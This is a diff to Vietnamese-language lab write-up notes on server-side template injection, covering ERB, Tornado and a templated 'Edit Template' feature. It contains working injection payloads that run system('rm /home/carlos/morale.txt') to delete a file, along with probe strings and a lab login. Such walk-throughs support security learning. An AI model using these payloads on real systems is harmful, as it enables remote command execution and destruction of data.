@@ -4,6 +4,15 @@ Khi xem product với id=1, nhận thấy message "Unfortunately this product is
 Lab description cho ta biết website sử dụng ERB template, như vậy ta chuyển đến URL `/?message=<%=system("rm /home/carlos/morale.txt")` để xóa file morale.txt. Kết quả thành công.
 
 # 2. Basic server-side template injection (code context)
+Website có chức năng "Preferred name", sẽ quyết định tên của user được hiển thị như thế nào trong các comment. Để thay đổi Preferred name, ta submit request: `POST /my-account/change-blog-post-author-display` với hai tham số `blog-post-author-display=user.name&csrf=LVAmsI37Vy62hUbx5riYFHJ5KWBwH6e8`.
+
+Ta submit một comment, thực hiện thay đổi tham số `blog-post-author-display` và test kết quả bằng cách xem thông tin hiển thị trong phần tên người submit comment.
+
+Thay đổi `blog-post-author-display=7*7` => response trả về 49
+
+Thay đổi `blog-post-author-display=a.b` => response trả về lỗi cho ta biết website sử dụng Tornado template
+
+Thay đổi `blog-post-author-display=7*7}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}` => file được xóa thành công.
 
 # 3. Server-side template injection using documentation
 Đăng nhập với credentails "content-manager:C0nt3ntM4n4g3r", ta thấy có chức năng "Edit Template" và có thể Preview sau khi edit. Thử chèn payload `${7*7}` thì trong response có số 49, như vậy website có lỗ hổng SSTI.
